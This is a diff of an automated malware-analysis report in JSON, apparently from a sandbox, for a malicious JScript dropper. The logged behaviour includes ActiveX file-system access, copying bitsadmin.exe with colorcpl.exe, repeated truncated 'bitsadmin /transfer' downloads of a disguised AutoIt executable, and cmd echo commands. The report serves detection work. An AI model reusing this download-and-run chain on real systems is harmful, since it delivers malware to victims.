@@ -1,7 +1,7 @@
 {
   "extra": {
     "drop_file": false,
-    "score": 642,
+    "score": 632,
     "sections": [
       {
         "auto_collapse": false,
@@ -38,29 +38,7 @@
       },
       {
         "auto_collapse": false,
-        "body": "JavaScript creates an object representing a hard drive\n\t\tnew DriveObject[17](C:)\n\n\t\tDriveObject[17](C:).name = (string) 'C:'\n\n\t\tnew Collection[18]([?  {?    id: 17,?    _name: 'DriveObject[17](C:)',?    _availablespace: '',?    ...\n\t\tnew DriveObject[21](C:)\n\n\t\tDriveObject[21](C:).name = (string) 'C:'\n\n\t\tnew Collection[22]([?  {?    id: 21,?    _name: 'DriveObject[21](C:)',?    _availablespace: '',?    ...",
-        "body_format": "TEXT",
-        "classification": "TLP:W",
-        "depth": 1,
-        "heuristic": {
-          "attack_ids": [],
-          "frequency": 1,
-          "heur_id": 3,
-          "score": 10,
-          "score_map": {
-            "drive_object": 10
-          },
-          "signatures": {
-            "drive_object": 1
-          }
-        },
-        "tags": {},
-        "title_text": "Signature: DriveObject",
-        "zeroize_on_tag_safe": false
-      },
-      {
-        "auto_collapse": false,
-        "body": "JavaScript creates an ActiveXObject to gain access to the computer's file system\n\t\tActiveXObject(Scripting.FileSystemObject)\n\n\t\tnew Scripting.FileSystemObject[16]\n\n\t\tScripting.FileSystemObject[16].FileExists(C:\\Users\\Public\\po) => false\n\n\t\tnew Scripting.FileSystemObject[20]\n\n\t\tScripting.FileSystemObject[20].CreateFolder(C:\\W63770416524\\)\n\n\t\tScripting.FileSystemObject[16].FileExists(C:\\W63770416524\\Nokia.Tivit.2022.2671.560.AutoIt3.exe) => ...\n\t\t \tvar eePQYAweHJLwigWOeChvc = new ActiveXObject(\\\"Scripting.FileSystemObject\\\")\n\t\t\t\t\t\t\t\t var RIOInbGPaTECWiezoRewQpEN = new ActiveXObject(\\\"Scripting.FileSystemObject\\\")\n\t\t\tvar eePQYAweHJLwigWOeChvc = new ActiveXObject(\"Scripting.FileSystemObject\")\n\t\t\t\t var RIOInbGPaTECWiezoRewQpEN = new ActiveXObject(\"Scripting.FileSystemObject\")",
+        "body": "JavaScript creates an ActiveXObject to gain access to the computer's file system\n\t\tActiveXObject(Scripting.FileSystemObject)\n\n\t\tnew Scripting.FileSystemObject[11]()\n\n\t\tScripting.FileSystemObject[11].FileExists(\"C:\\Users\\Public\\po\")\n\n\t\tnew Scripting.FileSystemObject[13]()\n\n\t\tScripting.FileSystemObject[13].CreateFolder(\"C:\\W63770416524\\\")\n\n\t\tScripting.FileSystemObject[11].FileExists(\"C:\\W63770416524\\Nokia.Tivit.2022.2671.560.AutoIt3.exe\")\n\n\t\t \tvar eePQYAweHJLwigWOeChvc = new ActiveXObject(\\\"Scripting.FileSystemObject\\\")\n\t\t\t\t\t\t\t\t var RIOInbGPaTECWiezoRewQpEN = new ActiveXObject(\\\"Scripting.FileSystemObject\\\")\n\t\t\tvar eePQYAweHJLwigWOeChvc = new ActiveXObject(\"Scripting.FileSystemObject\")\n\t\t\t\t var RIOInbGPaTECWiezoRewQpEN = new ActiveXObject(\"Scripting.FileSystemObject\")",
         "body_format": "TEXT",
         "classification": "TLP:W",
         "depth": 1,
@@ -82,7 +60,7 @@
       },
       {
         "auto_collapse": false,
-        "body": "JavaScript creates a new Windows Scripting Host Shell Object\n\t\tnew WScript.Shell[19]\n",
+        "body": "JavaScript creates a new Windows Scripting Host Shell Object\n\t\tnew WScript.Shell[12]()\n",
         "body_format": "TEXT",
         "classification": "TLP:W",
         "depth": 1,
@@ -104,7 +82,7 @@
       },
       {
         "auto_collapse": false,
-        "body": "JavaScript runs dropped executable\n\t\tWScript.Shell[19].Run(colorcpl.exe C:\\\\Windows\\\\System32\\\\bitsadmin.exe, 0, true)\n\n\t\tWScript.Shell[19].Run(C:\\\\Windows\\\\System32\\\\bitsadmin.exe /reset, 0, true)\n\n\t\tWScript.Shell[19].Run(C:\\\\Windows\\\\System32\\\\spool\\\\drivers\\\\color\\\\bitsadmin.exe /transfer 41450223...\n\t\tWScript.Shell[19].Run(C:\\\\Windows\\\\System32\\\\spool\\\\drivers\\\\color\\\\bitsadmin.exe /transfer 41450223...\n\t\tWScript.Shell[19].Run(C:\\\\Windows\\\\System32\\\\spool\\\\drivers\\\\color\\\\bitsadmin.exe /transfer 41450223...\n\t\tWScript.Shell[19].Run(C:\\\\Windows\\\\System32\\\\spool\\\\drivers\\\\color\\\\bitsadmin.exe /transfer 41450223...\n\t\tWScript.Shell[19].Run(C:\\\\Windows\\\\System32\\\\spool\\\\drivers\\\\color\\\\bitsadmin.exe /transfer 41450223...\n\t\tWScript.Shell[19].Run(C:\\\\Windows\\\\System32\\\\spool\\\\drivers\\\\color\\\\bitsadmin.exe /transfer 41450223...\n\t\tWScript.Shell[19].Run(C:\\\\Windows\\\\System32\\\\spool\\\\drivers\\\\color\\\\bitsadmin.exe /transfer 41450223...",
+        "body": "JavaScript runs dropped executable\n\t\tWScript.Shell[12].run(\"colorcpl.exe C:\\\\Windows\\\\System32\\\\bitsadmin.exe\", 0, true)\n\n\t\tWScript.Shell[12].run(\"C:\\\\Windows\\\\System32\\\\bitsadmin.exe /reset\", 0, true)\n\n\t\tWScript.Shell[12].run(\"C:\\\\Windows\\\\System32\\\\spool\\\\drivers\\\\color\\\\bitsadmin.exe /transfer 4145022...\n\t\tWScript.Shell[12].run(\"C:\\\\Windows\\\\System32\\\\spool\\\\drivers\\\\color\\\\bitsadmin.exe /transfer 4145022...\n\t\tWScript.Shell[12].run(\"C:\\\\Windows\\\\System32\\\\spool\\\\drivers\\\\color\\\\bitsadmin.exe /transfer 4145022...\n\t\tWScript.Shell[12].run(\"C:\\\\Windows\\\\System32\\\\spool\\\\drivers\\\\color\\\\bitsadmin.exe /transfer 4145022...\n\t\tWScript.Shell[12].run(\"C:\\\\Windows\\\\System32\\\\spool\\\\drivers\\\\color\\\\bitsadmin.exe /transfer 4145022...\n\t\tWScript.Shell[12].run(\"C:\\\\Windows\\\\System32\\\\spool\\\\drivers\\\\color\\\\bitsadmin.exe /transfer 4145022...\n\t\tWScript.Shell[12].run(\"C:\\\\Windows\\\\System32\\\\spool\\\\drivers\\\\color\\\\bitsadmin.exe /transfer 4145022...",
         "body_format": "TEXT",
         "classification": "TLP:W",
         "depth": 1,
@@ -126,7 +104,7 @@
       },
       {
         "auto_collapse": false,
-        "body": "JavaScript runs code via shell\n\t\tWScript.Shell[19].Run(cmd /V /C \"echo C:\\W63770416524\\>C:\\Users\\Public\\po\"&& exit, 0, true)\n\n\t\tWScript.Shell[19].Run(colorcpl.exe C:\\\\Windows\\\\System32\\\\bitsadmin.exe, 0, true)\n\n\t\tWScript.Shell[19].Run(C:\\\\Windows\\\\System32\\\\bitsadmin.exe /reset, 0, true)\n\n\t\tWScript.Shell[19].Run(C:\\\\Windows\\\\System32\\\\spool\\\\drivers\\\\color\\\\bitsadmin.exe /transfer 41450223...\n\t\tWScript.Shell[19].Run(C:\\\\Windows\\\\System32\\\\spool\\\\drivers\\\\color\\\\bitsadmin.exe /transfer 41450223...\n\t\tWScript.Shell[19].Run(C:\\\\Windows\\\\System32\\\\spool\\\\drivers\\\\color\\\\bitsadmin.exe /transfer 41450223...\n\t\tWScript.Shell[19].Run(C:\\\\Windows\\\\System32\\\\spool\\\\drivers\\\\color\\\\bitsadmin.exe /transfer 41450223...\n\t\tWScript.Shell[19].Run(C:\\\\Windows\\\\System32\\\\spool\\\\drivers\\\\color\\\\bitsadmin.exe /transfer 41450223...\n\t\tWScript.Shell[19].Run(C:\\\\Windows\\\\System32\\\\spool\\\\drivers\\\\color\\\\bitsadmin.exe /transfer 41450223...\n\t\tWScript.Shell[19].Run(C:\\\\Windows\\\\System32\\\\spool\\\\drivers\\\\color\\\\bitsadmin.exe /transfer 41450223...\n\t\tWScript.Shell[19].Run(cmd /V /C \"echo Nokia.Tivit.2022.2671.560.AutoIt3>C:\\W63770416524\\\\r1.log\"&& e...\n\t\tWScript.Shell[19].Run(cmd /V /C \"echo Nokia.Tivit.2022.2671.560.AutoIt3>C:\\W63770416524\\\\r.log\"&& ex...",
+        "body": "JavaScript runs code via shell\n\t\tWScript.Shell[12].run(\"cmd /V /C \"echo C:\\W63770416524\\>C:\\Users\\Public\\po\"&& exit\", 0, true)\n\n\t\tWScript.Shell[12].run(\"colorcpl.exe C:\\\\Windows\\\\System32\\\\bitsadmin.exe\", 0, true)\n\n\t\tWScript.Shell[12].run(\"C:\\\\Windows\\\\System32\\\\bitsadmin.exe /reset\", 0, true)\n\n\t\tWScript.Shell[12].run(\"C:\\\\Windows\\\\System32\\\\spool\\\\drivers\\\\color\\\\bitsadmin.exe /transfer 4145022...\n\t\tWScript.Shell[12].run(\"C:\\\\Windows\\\\System32\\\\spool\\\\drivers\\\\color\\\\bitsadmin.exe /transfer 4145022...\n\t\tWScript.Shell[12].run(\"C:\\\\Windows\\\\System32\\\\spool\\\\drivers\\\\color\\\\bitsadmin.exe /transfer 4145022...\n\t\tWScript.Shell[12].run(\"C:\\\\Windows\\\\System32\\\\spool\\\\drivers\\\\color\\\\bitsadmin.exe /transfer 4145022...\n\t\tWScript.Shell[12].run(\"C:\\\\Windows\\\\System32\\\\spool\\\\drivers\\\\color\\\\bitsadmin.exe /transfer 4145022...\n\t\tWScript.Shell[12].run(\"C:\\\\Windows\\\\System32\\\\spool\\\\drivers\\\\color\\\\bitsadmin.exe /transfer 4145022...\n\t\tWScript.Shell[12].run(\"C:\\\\Windows\\\\System32\\\\spool\\\\drivers\\\\color\\\\bitsadmin.exe /transfer 4145022...\n\t\tWScript.Shell[12].run(\"cmd /V /C \"echo Nokia.Tivit.2022.2671.560.AutoIt3>C:\\W63770416524\\\\r1.log\"&& ...\n\t\tWScript.Shell[12].run(\"cmd /V /C \"echo Nokia.Tivit.2022.2671.560.AutoIt3>C:\\W63770416524\\\\r.log\"&& e...",
         "body_format": "TEXT",
         "classification": "TLP:W",
         "depth": 1,
@@ -240,7 +218,7 @@
     "extracted": [
       {
         "name": "extracted_wscript.bat",
-        "sha256": "2a416e0c97fe26824822c0abe60b93dfbe34584bddcce7a64c431160cf4984e3"
+        "sha256": "6cfd4e7f906b980fac443e072391c16caa5efd4a6640bcbf6a192fa756d03daf"
       }
     ],
     "supplementary": [
@@ -262,13 +240,6 @@
         "heur_id": 3,
         "signatures": [
           "active_x_object"
-        ]
-      },
-      {
-        "attack_ids": [],
-        "heur_id": 3,
-        "signatures": [
-          "drive_object"
         ]
       },
       {
